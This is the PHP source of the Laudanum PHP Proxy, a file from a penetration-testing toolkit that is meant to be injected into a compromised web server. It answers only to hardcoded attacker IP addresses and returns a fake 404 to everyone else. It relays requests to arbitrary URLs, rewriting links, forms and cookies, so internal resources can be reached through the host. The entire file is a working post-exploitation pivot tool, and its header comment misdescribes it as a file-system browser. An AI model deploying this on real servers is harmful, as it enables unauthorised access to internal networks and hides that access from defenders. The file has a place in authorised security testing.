<?php
ini_set('session.use_cookies', '0');
/* *****************************************************************************
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.secureideas.net
***  laudanum@secureideas.net
***
***  Project Leads:
***         Kevin Johnson <kjohnson@secureideas.net
***         Tim Medin <tim@counterhack.com>
***
*** Copyright 2014 by Kevin Johnson and the Laudanum Team
***
********************************************************************************
***
*** This file allows browsing of the file system.
*** Written by Tim Medin <tim@counterhack.com>
***
********************************************************************************
*** This program is free software; you can redistribute it and/or
*** modify it under the terms of the GNU General Public License
*** as published by the Free Software Foundation; either version 2
*** of the License, or (at your option) any later version.
***
*** This program is distributed in the hope that it will be useful,
*** but WITHOUT ANY WARRANTY; without even the implied warranty of
*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*** GNU General Public License for more details.
***
*** You can get a copy of the GNU General Public License from this
*** address: http://www.gnu.org/copyleft/gpl.html#SEC1
*** You can also write to the Free Software Foundation, Inc., 59 Temple
*** Place - Suite 330, Boston, MA  02111-1307, USA.
***
***************************************************************************** */

// TODO: If the remote site uses a sessionid it collides with the php sessionid cookie from this page
// figure out how to reuse sessionid from the remote site

// ***************** Config entries below ***********************

// IPs are enterable as individual addresses TODO: add CIDR support
$allowedIPs = array("19.168.2.16", "192.168.1.100","127.0.0.1","192.168.10.129","192.168.10.1");

# *********** No editable content below this line **************

$allowed = 0;
foreach ($allowedIPs as $IP) {
    if ($_SERVER["REMOTE_ADDR"] == $IP)
        $allowed = 1;
}

if ($allowed == 0) {
    header("HTTP/1.0 404 Not Found");
    die();
}

/* This error handler will turn all notices, warnings, and errors into fatal
 * errors, unless they have been suppressed with the @-operator. */
function error_handler($errno, $errstr, $errfile, $errline, $errcontext) {
    /* The @-opertor (used with chdir() below) temporarely makes
     * error_reporting() return zero, and we don't want to die in that case.
     * We do note the error in the output, though. */
    if (error_reporting() == 0) {
        $_SESSION['output'] .= $errstr . "\n";
    } else {
        die('<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
   "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <title>Laudanum PHP Proxy</title>
</head>
<body>
  <h1>Fatal Error!</h1>
  <p><b>' . $errstr . '</b></p>
  <p>in <b>' . $errfile . '</b>, line <b>' . $errline . '</b>.</p>

  <hr>
  <address>
  Copyright &copy; 2014, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
  Written by Tim Medin.<br/>
  Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
  </address>

</body>
</html>');
    }
}

set_error_handler('error_handler');

function geturlarray($u) {
  // creates the url array, addes a scheme if it is missing and retries parsing
  $o = parse_url($u);
  if (!isset($o["scheme"])) { $o = parse_url("http://" . $u); }
  if (!isset($o["path"])) { $o["path"] = "/"; }
  return $o;
}

function buildurl ($u) {
  // build the url from the url array
  // this is used because the built in function isn't 
  // avilable in all installs of php
  if (!isset($u["host"])) { return null; }

  $s  = isset($u["scheme"])   ? $u["scheme"]         : "http";
  $s .= "://" . $u["host"];
  $s .= isset($u["port"])     ? ":" . $u["port"]     : "";
  $s .= isset($u["path"])     ? $u["path"]           : "/";
  $s .= isset($u["query"])    ? "?" . $u["query"]    : "";
  $s .= isset($u["fragment"]) ? "#" . $u["fragment"] : "";
  return $s;
}

function buildurlpath ($u) {
  //gets the full url and attempts to remove the file at the end of the url
  // e.g. http://blah.com/dir/file.ext => http://blah.com/dir/
  if (!isset($u["host"])) { return null; }

  $s    = isset($u["scheme"])? $u["scheme"]     : "http";
  $s   .= "://" . $u["host"];
  $s   .= isset($u["port"])  ? ":" . $u["port"] : "";

  $path = isset($u["path"])  ? $u["path"]       : "/";
  // is the last portion of the path a file or a dir?
  // assume if there is a . it is a file
  // if it ends in a / then it is a dir
  // if neither, than assume dir
  $dirs = explode("/", $path);
  $last = $dirs[count($dirs) - 1];
  if (preg_match('/\./', $last) || !preg_match('/\/$/', $last)) {
    // its a file, remove the last chunk
    $path = substr($path, 0, -1 * strlen($last));
  }    
  
  $s .= $path;
  return $s;
}

function getfilename ($u) {
  // returns the file name
  // e.g. http://blah.com/dir/file.ext returns file.ext
  // technically, it is the last portion of the url, so there is a potential
  // for a problem if a http://blah.com/dir returns a file
  $s = explode("/", $u["path"]);
  return $s[count($s) - 1];
}

function getcontenttype ($headers) {
  // gets the content type
  foreach($headers as $h) {
    if (preg_match_all("/^Content-Type: (.*)$/", $h, $out)) {
      return $out[1][0];
    }
  }
}

function getcontentencoding ($headers) {
  foreach ($headers as $h) {
    if (preg_match_all("/^Content-Encoding: (.*)$/", $h, $out)) {
      return $out[1][0];
    }
  }
}

function removeheader($header, $headers) {
  foreach (array_keys($headers) as $key) {
    if (preg_match_all("/^" . $header . ": (.*)$/", $headers[$key], $out)) {
      unset($headers[$key]);
      return $headers;
    }
  }
}

function rewritecookies($headers) {
  // removes the path and domain from cookies
  for ($i = 0; $i < count($headers); $i++) {
    if (preg_match_all("/^Set-Cookie:/", $headers[$i], $out)) {
      $headers[$i] = preg_replace("/domain=[^[:space:]]+/", "", $headers[$i]);
      $headers[$i] = preg_replace("/path=[^[:space:]]+/", "", $headers[$i]);
    }
  }
  return $headers;
}

function getsessionid($headers) {
  for ($i = 0; $i < count($headers); $i++) {
    if (preg_match_all("/^Set-Cookie: SessionID=([a-zA-Z0-9]+);/", $headers[$i], $out))
      return $out[1][0];
  }
  return "0";
}

function compatible_gzinflate($gzData) {
  if ( substr($gzData, 0, 3) == "\x1f\x8b\x08" ) {
    $i = 10;
    $flg = ord( substr($gzData, 3, 1) );
    if ( $flg > 0 ) {
      if ( $flg & 4 ) {
        list($xlen) = unpack('v', substr($gzData, $i, 2) );
        $i = $i + 2 + $xlen;
      }
      if ( $flg & 8 )
        $i = strpos($gzData, "\0", $i) + 1;
      if ( $flg & 16 )
        $i = strpos($gzData, "\0", $i) + 1;
      if ( $flg & 2 )
        $i = $i + 2;
    }
    return @gzinflate( substr($gzData, $i, -8) );
    } else {
    return false;
  }
  return false;
}

function rewrite ($d, $u) {
  $r = $d;
  //rewrite images and links - absolute reference
  $r = preg_replace("/((src|href).?=.?['\"]?)(\/[^'\"[:space:]]+['\"]?)/", "\\1" . $_SERVER["PHP_SELF"] . "?laudurl=" . $u["scheme"] . "://" . $u["host"] . "\\3", $r);
  //rewrite images and links - hard linked
  $r = preg_replace("/((src|href).?=.?['\"])(http[^'\"]+['\"])/", "\\1" . $_SERVER["PHP_SELF"] . "?laudurl=" . "\\3", $r);
  //rewrite images and links - relative reference
  $r = preg_replace("/((src|href).?=.?['\"])([^\/][^'\"[:space:]]+['\"]?)/", "\\1" . $_SERVER["PHP_SELF"] . "?laudurl=" . buildurlpath($u) . "\\3", $r);


  //rewrite form - absolute reference
  $r = preg_replace("/(<form(.+?)action.?=.?['\"])(\/[^'\"]+)(['\"])([^\>]*?)>/", "\\1" . $_SERVER["PHP_SELF"] . "\\4><input type=\"hidden\" name=\"laudurl\" value=\"" . $u["scheme"] . "://" . $u["host"] . "\\3\">", $r);
  //rewrite form - hard linked
  $r = preg_replace("/(<form(.+?)action.?=.?['\"])(http[^'\"]+)(['\"])([^\>]*?)>/", "\\1" . $_SERVER["PHP_SELF"] . "\\4><input type=\"hidden\" name=\"laudurl\" value=\"" . "\\3\">", $r);
  //rewrite form - relative reference
  $r = preg_replace("/(<form(.+?)action.?=.?['\"])([^\/][^'\"]+)(['\"])([^\>]*?)>/", "\\1" . $_SERVER["PHP_SELF"] . "\\4><input type=\"hidden\" name=\"laudurl\" value=\"" . buildurlpath($u) . "\\3\">", $r);
  return $r;
}

/* Initialize some variables we need again and again. */
$url = isset($_GET["laudurl"]) ? $_GET["laudurl"] : "";
if ($url == "") {
  $url = isset($_POST["laudurl"]) ? $_POST["laudurl"] : "";
}

if ($url == "") {
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
   "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <title>Laudanum PHP Proxy</title>
  <link rel="stylesheet" href="style.css" type="text/css">

  <script type="text/javascript">
    function init() {
      document.proxy.url.focus();
    }
  </script>
</head>
<body onload="init()">

<h1>Laudanum PHP Proxy</h1>

<form method="GET" name="proxy">
<input type="text" name="laudurl" size="70">

</form>
  <hr>
  <address>
  Copyright &copy; 2014, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
  Written by Tim Medin.<br/>
  Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
  </address>
</body>
</html>

<?php
} else {

  $url_c = geturlarray($url);
  $params = array_merge($_GET, $_POST);
  
  //don't pass throught the parameter we are using
  unset($params["laudurl"]);

  //create the query or post parameters
  $query = http_build_query($params);
  if ($query != "") {
    $url_c["query"] = $query;
  }

  //get the files
  $fp = fopen(buildurl($url_c), "rb");

  // use the headers, except the response code which is popped off the array
  $headers = $http_response_header;
  // pop
  array_shift($headers);
  
  // fix cookies
  $headers = rewritecookies($headers);

  $ctype = getcontenttype($headers);
  $cencoding = getcontentencoding($headers);
    
  // we will remove gzip encoding later, but we need to remove the header now
  // before it is added to the response.
  if ($cencoding == "gzip")
    $headers = removeheader("Content-Encoding", $headers);

  // set headers for response to client
  if (preg_match("/text|image/", $ctype)) {
    header_remove();
    // the number of headers can change due to replacement
    $i = 0;
    while ($i < count($headers)) { 
      if (strpos($headers[$i], "Set-Cookie:") == false)
        // replace headers
        header($headers[$i], true);
      else
        // if it is the first cookie, replace all the others. Otherwise add
        header($headers[$i], false);
      $i++;
    }
  } else {
    header("Content-Disposition: attachment; filename=" . getfilename($url_c));
  }
  
  // get data
  if (preg_match("/text/",$ctype)) { //text
    //it is a text format: html, css, js
    $data = "";
    while (!feof($fp)) {
      $data .= fgets($fp, 4096);
    }

    // uncompress it so it can be rewritten
    if ($cencoding == "gzip")
      $data = compatible_gzinflate($data);

    // rewrite all the links and such
    echo rewrite($data, $url_c);

  } else {
    // binary format or something similar, let it go through
    fpassthru($fp);
    fclose($fp);
  }
}
?>
